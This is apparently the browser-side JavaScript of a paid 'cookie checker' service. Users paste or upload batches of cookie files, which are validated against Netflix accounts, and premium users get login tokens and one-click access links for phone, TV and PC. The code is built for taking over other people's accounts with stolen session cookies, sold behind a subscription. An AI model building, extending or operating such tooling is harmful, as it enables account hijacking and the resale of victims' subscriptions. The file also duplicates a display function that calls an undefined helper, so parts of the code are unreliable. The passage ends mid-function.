// Global state
let currentUser = null;
let accessToken = null;
let currentMode = "check_only";
let batchMode = "check_only";
let selectedFiles = [];
let batchResultsData = [];
let isPremium = false;
let useStreaming = true;
let allAccounts = [];
let filteredAccounts = [];

// API Configuration
// const API_URL = "https://prem-eu3.bot-hosting.net:21582";
const API_URL = "https://hadowken-api.vercel.app";

// DOM Elements
const authModal = document.getElementById("auth-modal");
const authForm = document.getElementById("auth-form");
const authTitle = document.getElementById("auth-title");
const authSubmitText = document.getElementById("auth-submit-text");
const authSwitchText = document.getElementById("auth-switch-text");
const authSwitchBtn = document.getElementById("auth-switch-btn");
const authError = document.getElementById("auth-error");
const loginPrompt = document.getElementById("login-prompt");
const mainTabs = document.getElementById("main-tabs");
const authSection = document.getElementById("auth-section");
const userBadge = document.getElementById("user-badge");
const accountsTab = document.getElementById("accounts-tab");
const tokenModal = document.getElementById("token-modal");

let isLoginMode = true;

// Initialize
document.addEventListener("DOMContentLoaded", () => {
  checkSession();
  initTabs();
  initEventListeners();
  updateModeUI();
  updateBatchModeUI();
});

window.addEventListener("beforeunload", () => {
  document.getElementById("cookie-input").value = "";
  batchResultsData = [];
});

function sanitizeDisplay(text) {
  if (!text) return "N/A";
  // Mask email: a***@example.com
  if (text.includes("@")) {
    const [user, domain] = text.split("@");
    return user.charAt(0) + "***@" + domain;
  }
  return text;
}

// document.addEventListener("DOMContentLoaded", () => {
//   // Start with body not logged in
//   document.body.classList.remove("logged-in");

//   checkSession();
//   initTabs();
//   initEventListeners();
//   updateModeUI();
//   updateBatchModeUI();
// });

// Auth Functions
function showAuthModal() {
  authModal.classList.add("show");
  authError.textContent = "";
}

function hideAuthModal() {
  authModal.classList.remove("show");
}

function toggleAuthMode() {
  isLoginMode = !isLoginMode;
  authTitle.textContent = isLoginMode ? "Login" : "Sign Up";
  authSubmitText.textContent = isLoginMode ? "Login" : "Sign Up";
  authSwitchText.textContent = isLoginMode
    ? "Don't have an account?"
    : "Already have an account?";
  authSwitchBtn.textContent = isLoginMode ? "Sign Up" : "Login";
  authError.textContent = "";
}

async function handleAuth(e) {
    e.preventDefault();
    const email = document.getElementById("auth-email").value;
    const password = document.getElementById("auth-password").value;
    const submitBtn = document.getElementById("auth-submit");

    submitBtn.disabled = true;
    submitBtn.innerHTML = '<i class="fas fa-circle-notch fa-spin"></i> Processing...';

    try {
        const endpoint = isLoginMode ? "/api/auth/login" : "/api/auth/signup";
        const response = await fetch(`${API_URL}${endpoint}`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ email, password }),
        });

        const data = await response.json();

        if (data.status === "success") {
            if (isLoginMode) {
                let session, user;
                
                // Handle encrypted response
                if (data.encrypted && data.data) {
                    // Initialize crypto first
                    const key = localStorage.getItem('api_encryption_key');
                    if (key) {
                        await apiCrypto.initialize(key);
                    } else {
                        // Fetch key if not in storage
                        await fetchEncryptionKey();
                    }
                    
                    // Decrypt the data
                    const decrypted = await apiCrypto.decryptResponse(data.data);
                    session = decrypted.session;
                    user = decrypted.user;
                } else {
                    // Plaintext response (fallback)
                    session = data.session;
                    user = data.user;
                }
                
                accessToken = session.access_token;
                currentUser = user;
                isPremium = user.is_premium;
                
                localStorage.setItem("access_token", accessToken);
                localStorage.setItem("refresh_token", session.refresh_token);
                
                updateUIForUser();
                hideAuthModal();
                showNotification("Login successful!");
            } else {
                showNotification("Account created! Please login.");
                toggleAuthMode();
            }
        } else {
            authError.textContent = data.message;
        }
    } catch (error) {
        console.error("Auth error:", error);
        authError.textContent = "Network error. Please try again.";
    } finally {
        submitBtn.disabled = false;
        submitBtn.innerHTML = `<i class="fas fa-sign-in-alt"></i> ${isLoginMode ? "Login" : "Sign Up"}`;
    }
}

async function checkSession() {
  const token = localStorage.getItem("access_token");

  // No token - force show login
  if (!token) {
    forceShowLogin();
    return;
  }

  try {
    const response = await fetch(`${API_URL}/api/auth/me`, {
      headers: { Authorization: `Bearer ${token}` },
      credentials: "include",
      mode: "cors",
    });

    const data = await response.json();

    if (data.status === "success") {
      accessToken = token;
      currentUser = data.user;
      isPremium = data.user.is_premium;
      document.body.classList.add("logged-in");
      updateUIForUser();
    } else {
      // Invalid token - force login
      localStorage.removeItem("access_token");
      localStorage.removeItem("refresh_token");
      forceShowLogin();
    }
  } catch (error) {
    console.error("Session check failed:", error);
    forceShowLogin();
  }
}

function forceShowLogin() {
  // Ensure body is not logged in state
  document.body.classList.remove("logged-in");

  // Hide all main content
  document.getElementById("main-tabs").style.display = "none";
  document.querySelectorAll(".tab-content").forEach((c) => {
    c.style.display = "none";
    c.classList.remove("active");
  });

  // Show login prompt
  const loginPrompt = document.getElementById("login-prompt");
  loginPrompt.style.display = "flex";

  // Auto-show auth modal after short delay
  setTimeout(() => {
    showAuthModal();
  }, 500);

  // Update auth section
  authSection.innerHTML = `
        <button class="btn btn-auth" onclick="showAuthModal()">
            <i class="fas fa-sign-in-alt"></i> Login
        </button>
    `;

  document.getElementById("user-status").textContent = "Not logged in";
}

function updateUIForUser() {
  if (!currentUser) {
    forceShowLogin();
    return;
  }

  // User is logged in
  document.body.classList.add("logged-in");

  // Hide login prompt
  const loginPrompt = document.getElementById("login-prompt");
  loginPrompt.style.display = "none";

  // Show main content
  document.getElementById("main-tabs").style.display = "flex";
  document.getElementById("single-tab").style.display = "block";
  document.getElementById("single-tab").classList.add("active");

  // Update auth section
  authSection.innerHTML = `
        <div class="user-menu">
            <span class="user-email">${currentUser.email}</span>
            <button class="btn btn-auth" onclick="logout()">
                <i class="fas fa-sign-out-alt"></i> Logout
            </button>
        </div>
    `;

  // Update badge
  userBadge.textContent = isPremium ? "PREMIUM" : "FREE";
  userBadge.className = isPremium ? "premium-badge premium" : "premium-badge";
  userBadge.style.display = "inline-block";

  // Show/hide premium features
  if (isPremium) {
    accountsTab.style.display = "flex";
    document.getElementById("token-mode-btn").classList.remove("disabled");
    document
      .getElementById("batch-token-mode-btn")
      .classList.remove("disabled");
    document.getElementById("pricing-section").style.display = "none";
  } else {
    accountsTab.style.display = "none";
    document.getElementById("token-mode-btn").classList.add("disabled");
    document.getElementById("batch-token-mode-btn").classList.add("disabled");
  }

  document.getElementById("user-status").textContent =
    `Logged in as ${currentUser.email}`;
}

async function logout() {
  try {
    await fetch(`${API_URL}/api/auth/logout`, {
      method: "POST",
      headers: { Authorization: `Bearer ${accessToken}` },
    });
  } catch (e) {
    console.error("Logout error:", e);
  }

  localStorage.removeItem("access_token");
  localStorage.removeItem("refresh_token");
  currentUser = null;
  accessToken = null;
  isPremium = false;

  location.reload();
}

// API Helper
async function apiCall(endpoint, options = {}) {
  const headers = {
    "Content-Type": "application/json",
    ...options.headers,
  };

  if (accessToken) {
    headers["Authorization"] = `Bearer ${accessToken}`;
  }

  const response = await fetch(`${API_URL}${endpoint}`, {
    method: options.method || "GET",
    headers: headers,
    body: options.body,
    credentials: "include",
    mode: "cors",
  });

  if (response.status === 401) {
    showNotification("Session expired. Please login again.", true);
    logout();
    return null;
  }

  return response.json();
}
// Tab Handling
function initTabs() {
  const tabs = document.querySelectorAll(".tab");
  const contents = document.querySelectorAll(".tab-content");

  tabs.forEach((tab) => {
    tab.addEventListener("click", () => {
      const tabId = tab.dataset.tab;

      //console.log("Tab clicked:", tabId); // DEBUG

      // Check auth for protected tabs
      if (
        (tabId === "single" || tabId === "batch" || tabId === "accounts") &&
        !currentUser
      ) {
        showAuthModal();
        return;
      }

      // Check premium for accounts tab
      if (tabId === "accounts" && !isPremium) {
        showNotification("Premium subscription required", true);
        return;
      }

      tabs.forEach((t) => t.classList.remove("active"));
      contents.forEach((c) => {
        c.classList.remove("active");
        c.style.display = "none";
      });

      tab.classList.add("active");

      // Fix: Properly select the content element
      let selectedContent;
      if (tabId === "accounts") {
        selectedContent = document.getElementById("accounts-tab-content");
      } else {
        selectedContent = document.getElementById(`${tabId}-tab`);
      }

      //console.log("Selected content:", selectedContent); // DEBUG

      if (selectedContent) {
        selectedContent.style.display = "block";
        setTimeout(() => selectedContent.classList.add("active"), 10);
      }

      // Load accounts if accounts tab
      if (tabId === "accounts" && isPremium) {
        //console.log("Loading accounts..."); // DEBUG
        loadAccounts();
      }
    });
  });
}
// Mode Switching
const modeDescriptions = {
  check_only: {
    single: "Validates cookie and shows account info only",
    batch: "Validates all cookies without generating tokens",
    btnText: "Check Cookie",
    batchBtnText: "Check Cookies",
    emptyDesc: "Enter cookie data and click Check Cookie to validate",
  },
  generate_token: {
    single: "Validates cookie and generates access token with device links",
    batch: "Validates cookies and generates tokens for all valid accounts",
    btnText: "Generate Token",
    batchBtnText: "Generate Tokens",
    emptyDesc: "Enter cookie data and click Generate Token to get access links",
  },
};

function setMode(mode) {
  if (mode === "generate_token" && !isPremium) {
    showNotification("Upgrade to Premium to generate tokens", true);
    return;
  }
  currentMode = mode;
  document.querySelectorAll("#mode-switch .mode-option").forEach((opt) => {
    opt.classList.toggle("active", opt.dataset.mode === mode);
  });
  updateModeUI();
}

function updateModeUI() {
  const desc = modeDescriptions[currentMode];
  document.querySelector("#mode-description span").textContent = desc.single;
  document.getElementById("btn-text").textContent = desc.btnText;
  document.getElementById("empty-desc").textContent = desc.emptyDesc;
}

function setBatchMode(mode) {
  if (mode === "generate_token" && !isPremium) {
    showNotification("Upgrade to Premium to generate tokens", true);
    return;
  }
  batchMode = mode;
  document
    .querySelectorAll("#batch-mode-switch .mode-option")
    .forEach((opt) => {
      opt.classList.toggle("active", opt.dataset.mode === mode);
    });
  updateBatchModeUI();
}

function updateBatchModeUI() {
  const desc = modeDescriptions[batchMode];
  document.querySelector("#batch-mode-description span").textContent =
    desc.batch;
  document.getElementById("batch-btn-text").textContent = desc.batchBtnText;
}

// Event Listeners
function initEventListeners() {
  // Auth
  authForm.addEventListener("submit", handleAuth);

  // Mode switches
  document.querySelectorAll("#mode-switch .mode-option").forEach((opt) => {
    opt.addEventListener("click", () => setMode(opt.dataset.mode));
  });

  document
    .querySelectorAll("#batch-mode-switch .mode-option")
    .forEach((opt) => {
      opt.addEventListener("click", () => setBatchMode(opt.dataset.mode));
    });

  // Single check
  document.getElementById("paste-btn").addEventListener("click", handlePaste);
  document.getElementById("clear-btn").addEventListener("click", handleClear);
  document
    .getElementById("generate-btn")
    .addEventListener("click", handleGenerate);
  document
    .getElementById("copy-results-btn")
    .addEventListener("click", handleCopyResults);

  // File upload
  const dropZone = document.getElementById("drop-zone");
  const fileInput = document.getElementById("file-input");

  dropZone.addEventListener("click", () => fileInput.click());
  dropZone.addEventListener("dragover", (e) => {
    e.preventDefault();
    dropZone.classList.add("dragover");
  });
  dropZone.addEventListener("dragleave", () =>
    dropZone.classList.remove("dragover"),
  );
  dropZone.addEventListener("drop", handleFileDrop);
  fileInput.addEventListener("change", handleFileSelect);

  // Batch
  const batchDropZone = document.getElementById("batch-drop-zone");
  const batchFiles = document.getElementById("batch-files");

  batchDropZone.addEventListener("click", () => batchFiles.click());
  batchDropZone.addEventListener("dragover", (e) => {
    e.preventDefault();
    batchDropZone.classList.add("dragover");
  });
  batchDropZone.addEventListener("dragleave", () =>
    batchDropZone.classList.remove("dragover"),
  );
  batchDropZone.addEventListener("drop", handleBatchFileDrop);
  batchFiles.addEventListener("change", handleBatchFilesChange);

  document
    .getElementById("process-batch-btn")
    .addEventListener("click", handleProcessBatch);
  document
    .getElementById("save-results-btn")
    .addEventListener("click", handleSaveResults);
}

// File Handling
function handleFileDrop(e) {
  e.preventDefault();
  document.getElementById("drop-zone").classList.remove("dragover");
  const file = e.dataTransfer.files[0];
  if (file) readFile(file);
}

function handleFileSelect(e) {
  const file = e.target.files[0];
  if (file) readFile(file);
}

function readFile(file) {
  const reader = new FileReader();
  reader.onload = (e) => {
    document.getElementById("cookie-input").value = e.target.result;
    showNotification("File loaded successfully");
  };
  reader.readAsText(file);
}

function handlePaste() {
  navigator.clipboard
    .readText()
    .then((text) => {
      document.getElementById("cookie-input").value = text;
      showNotification("Content pasted from clipboard");
    })
    .catch(() => showNotification("Failed to read clipboard", true));
}

function handleClear() {
  document.getElementById("cookie-input").value = "";
  showNotification("Input cleared");
}

// Generate/Check
async function handleGenerate() {
  const content = document.getElementById("cookie-input").value.trim();
  if (!content) {
    showNotification("Please enter cookie data first", true);
    return;
  }

  const btn = document.getElementById("generate-btn");
  const progress = document.getElementById("progress");
  const status = document.getElementById("status");

  btn.disabled = true;
  btn.innerHTML =
    '<i class="fas fa-circle-notch fa-spin"></i><span>Processing...</span>';
  progress.style.width = "0%";
  status.innerHTML =
    '<i class="fas fa-circle-notch fa-spin"></i><span>Processing...</span>';

  try {
    const data = await apiCall("/api/check", {
      method: "POST",
      body: JSON.stringify({ content, mode: currentMode }),
    });

    if (!data) return;

    if (data.status === "success") {
      progress.style.width = "100%";
      status.innerHTML =
        '<i class="fas fa-check-circle"></i><span>Complete</span>';

      if (currentMode === "check_only") {
        displayCheckOnlyResult(data);
      } else {
        displayResults(data);
      }

      document.getElementById("result-badge").style.display = "block";
      showNotification(
        currentMode === "check_only"
          ? "Cookie validated"
          : "Token generated successfully",
      );
    } else {
      progress.style.width = "100%";
      status.innerHTML =
        '<i class="fas fa-times-circle"></i><span>Failed</span>';
      displayError(data.message);
      showNotification(data.message, true);
    }
  } catch (error) {
    progress.style.width = "100%";
    status.innerHTML = '<i class="fas fa-times-circle"></i><span>Error</span>';
    displayError("Network error: " + error.message);
    showNotification("Network error", true);
  } finally {
    btn.disabled = false;
    btn.innerHTML = `<i class="fas fa-bolt"></i><span>${modeDescriptions[currentMode].btnText}</span>`;
  }
}

// Display Functions
function displayCheckOnlyResult(data) {
  const resultData = data.data;
  const isValid = resultData.is_premium;
  const storedBadge = resultData.stored_in_db
    ? '<span class="stored-badge"><i class="fas fa-database"></i> Stored in DB</span>'
    : "";

  let html = `
        <div class="result-item">
            <div class="check-only-result ${isValid ? "valid" : "invalid"}">
                <div class="status-icon">
                    <i class="fas fa-${isValid ? "check-circle" : "exclamation-circle"}"></i>
                </div>
                <h3>${isValid ? "Valid Premium Account" : "Valid Account"} ${storedBadge}</h3>
                <p>Cookie is working and account is ${isValid ? "premium" : "standard"}</p>
                
                <div class="quick-info">
                    <div class="quick-info-item">
                        <div class="quick-info-label">Email</div>
                        <div class="quick-info-value">${sanitizeDisplay(resultData.email)}</div>
                    </div>
                    <div class="quick-info-item">
                        <div class="quick-info-label">Country</div>
                        <div class="quick-info-value">${resultData.country}</div>
                    </div>
                    <div class="quick-info-item">
                        <div class="quick-info-label">Plan</div>
                        <div class="quick-info-value">${resultData.plan}</div>
                    </div>
                    <div class="quick-info-item">
                        <div class="quick-info-label">Type</div>
                        <div class="quick-info-value" style="color: ${isValid ? "var(--accent-green)" : "var(--accent-orange)"}">
                            ${resultData.subscription_type}
                        </div>
                    </div>
                </div>
                ${
                  !isPremium && isValid
                    ? `
                <div class="upgrade-prompt">
                    <i class="fas fa-crown"></i>
                    <span>Upgrade to Premium to generate tokens for this account!</span>
                </div>
                `
                    : ""
                }
            </div>
        </div>
    `;

  document.getElementById("results").innerHTML = html;
  document.getElementById("copy-results-btn").disabled = false;
}

// UPDATED displayResults function
function displayResults(data) {
  const resultData = data.data;
  const expTime = resultData.expires
    ? new Date(resultData.expires * 1000).toLocaleString()
    : "Unknown";

  let html = `
        <div class="result-item">
            <div class="result-header">
                <div class="result-badge valid"><i class="fas fa-check"></i> VALID</div>
                ${resultData.is_premium ? '<div class="result-badge premium"><i class="fas fa-crown"></i> PREMIUM</div>' : ""}
                <div class="result-badge country"><i class="fas fa-globe"></i> ${resultData.country}</div>
            </div>
            
            <div class="account-info">
                <div class="info-row">
                    <span class="info-label"><i class="fas fa-envelope"></i> Email</span>
                    <span class="info-value">${sanitizeDisplay(resultData.email)}</span>
                </div>
                <div class="info-row">
                    <span class="info-label"><i class="fas fa-globe-americas"></i> Country</span>
                    <span class="info-value">${resultData.country}</span>
                </div>
                <div class="info-row">
                    <span class="info-label"><i class="fas fa-tag"></i> Plan</span>
                    <span class="info-value">${resultData.plan}</span>
                </div>
                <div class="info-row">
                    <span class="info-label"><i class="fas fa-gem"></i> Type</span>
                    <span class="info-value">${resultData.subscription_type}</span>
                </div>
            </div>
        </div>
    `;

  if (resultData.token && resultData.login_urls) {
    html += `
            <div class="result-item">
                <div class="device-links">
                    <div class="device-links-title">
                        <i class="fas fa-external-link-alt"></i> Quick Access Links
                    </div>
                    
                    <div class="device-grid">
                        <div class="device-card phone">
                            <div class="device-header">
                                <div class="device-icon"><i class="fas fa-mobile-alt"></i></div>
                                <div class="device-name">Mobile / Phone</div>
                            </div>
                            <a href="${resultData.login_urls.phone}" target="_blank" class="device-link">
                                <i class="fas fa-link"></i> Open Netflix on Mobile
                            </a>
                            <div class="device-actions">
                                <button class="btn-copy" onclick="copyToClipboard('${resultData.login_urls.phone}', 'Mobile link copied!')">
                                    <i class="fas fa-copy"></i> Copy Link
                                </button>
                                <button class="btn-copy" onclick="copyToClipboard('${resultData.token}', 'Token copied!')">
                                    <i class="fas fa-key"></i> Copy Token
                                </button>
                            </div>
                        </div>

                        <div class="device-card tv">
                            <div class="device-header">
                                <div class="device-icon"><i class="fas fa-tv"></i></div>
                                <div class="device-name">Smart TV</div>
                            </div>
                            <a href="${resultData.login_urls.tv}" target="_blank" class="device-link">
                                <i class="fas fa-link"></i> Open Netflix on TV
                            </a>
                            <div class="device-actions">
                                <button class="btn-copy" onclick="copyToClipboard('${resultData.login_urls.tv}', 'TV link copied!')">
                                    <i class="fas fa-copy"></i> Copy Link
                                </button>
                                <button class="btn-copy" onclick="copyToClipboard('${resultData.token}', 'Token copied!')">
                                    <i class="fas fa-key"></i> Copy Token
                                </button>
                            </div>
                        </div>

                        <div class="device-card pc">
                            <div class="device-header">
                                <div class="device-icon"><i class="fas fa-laptop"></i></div>
                                <div class="device-name">PC / Laptop</div>
                            </div>
                            <a href="${resultData.login_urls.pc}" target="_blank" class="device-link">
                                <i class="fas fa-link"></i> Open Netflix on PC
                            </a>
                            <div class="device-actions">
                                <button class="btn-copy" onclick="copyToClipboard('${resultData.login_urls.pc}', 'PC link copied!')">
                                    <i class="fas fa-copy"></i> Copy Link
                                </button>
                                <button class="btn-copy" onclick="copyToClipboard('${resultData.token}', 'Token copied!')">
                                    <i class="fas fa-key"></i> Copy Token
                                </button>
                            </div>
                        </div>
                    </div>
                </div>

                <div class="token-section">
                    <div class="token-header">
                        <span class="token-label"><i class="fas fa-key"></i> Token Details</span>
                        <span style="color: var(--text-muted); font-size: 0.85rem;">
                            <i class="fas fa-clock"></i> Expires: ${expTime}
                        </span>
                    </div>
                    <div class="token-value">${resultData.token}</div>
                </div>
            </div>
        `;
  }

  document.getElementById("results").innerHTML = html;
  document.getElementById("copy-results-btn").disabled = false;
}
function displayResults(data) {
  const resultData = data.data;
  const expTime = resultData.expires
    ? new Date(resultData.expires * 1000).toLocaleString()
    : "Unknown";

  let html = `
        <div class="result-item">
            <div class="result-header">
                <div class="result-badge valid"><i class="fas fa-check"></i> VALID</div>
                ${resultData.is_premium ? '<div class="result-badge premium"><i class="fas fa-crown"></i> PREMIUM</div>' : ""}
                <div class="result-badge country"><i class="fas fa-globe"></i> ${resultData.country}</div>
            </div>
            
            <div class="account-info">
                <div class="info-row">
                    <span class="info-label"><i class="fas fa-envelope"></i> Email</span>
                    <span class="info-value">${decodeEmail(resultData.email)}</span>
                </div>
                <div class="info-row">
                    <span class="info-label"><i class="fas fa-globe-americas"></i> Country</span>
                    <span class="info-value">${resultData.country}</span>
                </div>
                <div class="info-row">
                    <span class="info-label"><i class="fas fa-tag"></i> Plan</span>
                    <span class="info-value">${resultData.plan}</span>
                </div>
                <div class="info-row">
                    <span class="info-label"><i class="fas fa-gem"></i> Type</span>
                    <span class="info-value">${resultData.subscription_type}</span>
                </div>
            </div>
        </div>
    `;

  if (resultData.token && resultData.login_urls) {
    html += `
            <div class="result-item">
                <div class="device-links">
                    <div class="device-links-title">
                        <i class="fas fa-external-link-alt"></i> Quick Access Links
                    </div>
                    
                    <div class="device-grid">
                        <div class="device-card phone">
                            <div class="device-header">
                                <div class="device-icon"><i class="fas fa-mobile-alt"></i></div>
                                <div class="device-name">Mobile / Phone</div>
                            </div>
                            <a href="${resultData.login_urls.phone}" target="_blank" class="device-link">
                                <i class="fas fa-link"></i> Open Netflix on Mobile
                            </a>
                            <div class="device-actions">
                                <button class="btn-copy" onclick="copyToClipboard('${resultData.login_urls.phone}', 'Mobile link copied!')">
                                    <i class="fas fa-copy"></i> Copy Link
                                </button>
                                <button class="btn-copy" onclick="copyToClipboard('${resultData.token}', 'Token copied!')">
                                    <i class="fas fa-key"></i> Copy Token
                                </button>
                            </div>
                        </div>

                        <div class="device-card tv">
                            <div class="device-header">
                                <div class="device-icon"><i class="fas fa-tv"></i></div>
                                <div class="device-name">Smart TV</div>
                            </div>
                            <a href="${resultData.login_urls.tv}" target="_blank" class="device-link">
                                <i class="fas fa-link"></i> Open Netflix on TV
                            </a>
                            <div class="device-actions">
                                <button class="btn-copy" onclick="copyToClipboard('${resultData.login_urls.tv}', 'TV link copied!')">
                                    <i class="fas fa-copy"></i> Copy Link
                                </button>
                                <button class="btn-copy" onclick="copyToClipboard('${resultData.token}', 'Token copied!')">
                                    <i class="fas fa-key"></i> Copy Token
                                </button>
                            </div>
                        </div>

                        <div class="device-card pc">
                            <div class="device-header">
                                <div class="device-icon"><i class="fas fa-laptop"></i></div>
                                <div class="device-name">PC / Laptop</div>
                            </div>
                            <a href="${resultData.login_urls.pc}" target="_blank" class="device-link">
                                <i class="fas fa-link"></i> Open Netflix on PC
                            </a>
                            <div class="device-actions">
                                <button class="btn-copy" onclick="copyToClipboard('${resultData.login_urls.pc}', 'PC link copied!')">
                                    <i class="fas fa-copy"></i> Copy Link
                                </button>
                                <button class="btn-copy" onclick="copyToClipboard('${resultData.token}', 'Token copied!')">
                                    <i class="fas fa-key"></i> Copy Token
                                </button>
                            </div>
                        </div>
                    </div>
                </div>

                <div class="token-section">
                    <div class="token-header">
                        <span class="token-label"><i class="fas fa-key"></i> Token Details</span>
                        <span style="color: var(--text-muted); font-size: 0.85rem;">
                            <i class="fas fa-clock"></i> Expires: ${expTime}
                        </span>
                    </div>
                    <div class="token-value">${resultData.token}</div>
                </div>
            </div>
        `;
  }

  document.getElementById("results").innerHTML = html;
  document.getElementById("copy-results-btn").disabled = false;
}

function displayError(message) {
  document.getElementById("results").innerHTML = `
        <div class="result-item" style="border-left-color: var(--accent-red);">
            <div class="check-only-result invalid">
                <div class="status-icon">
                    <i class="fas fa-times-circle"></i>
                </div>
                <h3>Invalid Cookie</h3>
                <p>${message}</p>
            </div>
        </div>
    `;
  document.getElementById("copy-results-btn").disabled = false;
  document.getElementById("result-badge").style.display = "none";
}

function handleCopyResults() {
  const text = document.getElementById("results").innerText;
  copyToClipboard(text, "All results copied!");
}

// Batch Processing
function handleBatchFileDrop(e) {
  e.preventDefault();
  document.getElementById("batch-drop-zone").classList.remove("dragover");
  const files = Array.from(e.dataTransfer.files);
  handleFiles(files);
}

function handleBatchFilesChange(e) {
  const files = Array.from(e.target.files);
  handleFiles(files);
}

function handleFiles(files) {
  selectedFiles = files.filter(
    (f) => f.name.endsWith(".txt") || f.name.endsWith(".zip"),
  );
  updateFileList();
}

function updateFileList() {
  const fileList = document.getElementById("file-list");
  const fileCount = document.getElementById("file-count");

  fileList.innerHTML = "";
  fileCount.textContent = `${selectedFiles.length} file${selectedFiles.length !== 1 ? "s" : ""}`;

  if (selectedFiles.length === 0) {
    fileList.innerHTML = `
            <div class="file-item empty">
                <i class="fas fa-inbox"></i>
                <span>No files selected</span>
            </div>
        `;
    return;
  }

  selectedFiles.forEach((file) => {
    const item = document.createElement("div");
    item.className = "file-item";
    item.innerHTML = `
            <div class="file-icon"><i class="fas fa-file-alt"></i></div>
            <div class="file-info">
                <div class="file-name">${file.name}</div>
                <div class="file-size">${(file.size / 1024).toFixed(1)} KB</div>
            </div>
            <span class="file-status pending">Pending</span>
        `;
    fileList.appendChild(item);
  });

  document.getElementById("total-files").textContent = selectedFiles.length;
  document.getElementById("valid-files").textContent = "0";
  document.getElementById("invalid-files").textContent = "0";
}

async function handleProcessBatch() {
    if (selectedFiles.length === 0) {
        showNotification("Please select files first", true);
        return;
    }

    batchResultsData = [];
    const batchResults = document.getElementById("batch-results");
    batchResults.innerHTML = "";

    const btn = document.getElementById("process-batch-btn");
    const progress = document.getElementById("batch-progress");
    const status = document.getElementById("batch-status");
    const saveBtn = document.getElementById("save-results-btn");

    btn.disabled = true;
    saveBtn.disabled = true;

    // Process in chunks of 15 files to stay under 10 second limit
    const CHUNK_SIZE = 15;
    const totalChunks = Math.ceil(selectedFiles.length / CHUNK_SIZE);
    let allResults = [];
    let validCount = 0;
    let invalidCount = 0;

    try {
        for (let chunkIndex = 0; chunkIndex < totalChunks; chunkIndex++) {
            const start = chunkIndex * CHUNK_SIZE;
            const end = Math.min(start + CHUNK_SIZE, selectedFiles.length);
            const chunk = selectedFiles.slice(start, end);
            
            status.textContent = `Processing chunk ${chunkIndex + 1}/${totalChunks} (${start + 1}-${end} of ${selectedFiles.length})`;
            
            const formData = new FormData();
            chunk.forEach((file) => formData.append("files", file));
            formData.append("mode", batchMode);

            // Process this chunk with streaming
            const chunkResults = await processBatchChunk(formData, progress, start, selectedFiles.length);
            allResults.push(...chunkResults);
            
            // Update counts
            chunkResults.forEach(result => {
                if (result.status === 'success') {
                    validCount++;
                } else {
                    invalidCount++;
                }
            });
            
            // Update display after each chunk
            displayBatchResults(allResults);
            updateStats(selectedFiles.length, validCount, invalidCount);
            
            // Small delay between chunks to prevent overwhelming
            if (chunkIndex < totalChunks - 1) {
                await new Promise(resolve => setTimeout(resolve, 500));
            }
        }

        batchResultsData = allResults;
        progress.style.width = "100%";
        status.textContent = `Complete - ${validCount} valid, ${invalidCount} invalid`;
        saveBtn.disabled = false;
        
        showNotification(`Processed all ${selectedFiles.length} files!`);

    } catch (error) {
        console.error("Batch processing error:", error);
        progress.style.width = "100%";
        status.textContent = "Failed: " + error.message;
        showNotification(error.message, true);
    } finally {
        btn.disabled = false;
        btn.innerHTML = `<i class="fas fa-play"></i><span>${modeDescriptions[batchMode].batchBtnText}</span>`;
    }
}

async function processBatchChunk(formData, progressBar, startIndex, totalFiles) {
    const results = [];
    
    const response = await fetch(`${API_URL}/api/batch-check`, {
        method: "POST",
        headers: {
            Authorization: `Bearer ${accessToken}`,
            Accept: "text/event-stream",
        },
        body: formData,
    });

    if (!response.ok) {
        throw new Error(`HTTP error! status: ${response.status}`);
    }

    const reader = response.body.getReader();
    const decoder = new TextDecoder();
    let buffer = "";

    while (true) {
        const { done, value } = await reader.read();
        if (done) break;

        buffer += decoder.decode(value, { stream: true });
        const lines = buffer.split("\n");
        buffer = lines.pop();

        for (const line of lines) {
            if (line.startsWith("data: ")) {
                try {
                    const data = JSON.parse(line.slice(6));
                    
                    if (data.type === "progress") {
                        // Calculate overall progress
                        const overallCurrent = startIndex + data.current;
                        const overallPercent = (overallCurrent / totalFiles) * 100;
                        progressBar.style.width = `${overallPercent}%`;
                    } else if (data.type === "result") {
                        results.push(data.result);
                        
                        // Add to display immediately
                        if (data.result.status === 'success') {
                            addResultToDisplay(data.result, true);
                        } else {
                            addResultToDisplay(data.result, false);
                        }
                    } else if (data.type === "complete") {
                        return results;
                    }
                } catch (e) {
                    console.error("Parse error:", e);
                }
            }
        }
    }
    
    return results;
}
async function processBatchRegular(formData, progress, status, btn, saveBtn) {
  // Fallback for browsers that don't support streaming
  progress.style.width = "50%";
  status.textContent = "Processing...";

  const response = await fetch(`${API_URL}/api/batch-check`, {
    method: "POST",
    headers: {
      Authorization: `Bearer ${accessToken}`,
      Accept: "application/json",
    },
    body: formData,
  });

  const data = await response.json();

  if (data.status === "success") {
    batchResultsData = data.results || [];
    displayBatchResults(batchResultsData);
    progress.style.width = "100%";

    const valid = batchResultsData.filter((r) => r.status === "success").length;
    const invalid = batchResultsData.length - valid;
    status.textContent = `Complete - ${valid} valid, ${invalid} invalid`;
    saveBtn.disabled = false;

    showNotification(`Processed: ${valid} valid, ${invalid} invalid`);
  } else {
    throw new Error(data.message || "Unknown error");
  }

  btn.disabled = false;
  btn.innerHTML = `<i class="fas fa-play"></i><span>${modeDescriptions[batchMode].batchBtnText}</span>`;
}

function updateFileListProcessingState() {
  const fileItems = document.querySelectorAll(".file-item");
  fileItems.forEach((item) => {
    const statusSpan = item.querySelector(".file-status");
    if (statusSpan && statusSpan.textContent === "Pending") {
      statusSpan.className = "file-status processing";
      statusSpan.innerHTML = '<i class="fas fa-circle-notch fa-spin"></i>';
    }
  });
}

function updateFileItemStatus(filename, status) {
  const fileItems = document.querySelectorAll(".file-item");
  fileItems.forEach((item) => {
    const nameDiv = item.querySelector(".file-name");
    if (nameDiv && nameDiv.textContent.includes(filename.substring(0, 30))) {
      const statusSpan = item.querySelector(".file-status");
      if (statusSpan) {
        if (status === "processing") {
          statusSpan.className = "file-status processing";
          statusSpan.innerHTML = '<i class="fas fa-circle-notch fa-spin"></i>';
        } else if (status === "valid") {
          statusSpan.className = "file-status valid";
          statusSpan.innerHTML = '<i class="fas fa-check"></i> Done';
        } else if (status === "invalid") {
          statusSpan.className = "file-status invalid";
          statusSpan.innerHTML = '<i class="fas fa-times"></i> Failed';
        }
      }
    }
  });
}

function addResultToDisplay(result, isValid) {
  const batchResults = document.getElementById("batch-results");

  // Remove placeholder if exists
  const placeholder = batchResults.querySelector(".result-placeholder");
  if (placeholder) placeholder.remove();

  const item = document.createElement("div");
  item.className = "file-item";
  item.style.animation = "slideIn 0.3s ease";

  if (isValid) {
    const data = result;
    let extraInfo = "";

    if (batchMode === "generate_token" && data.token) {
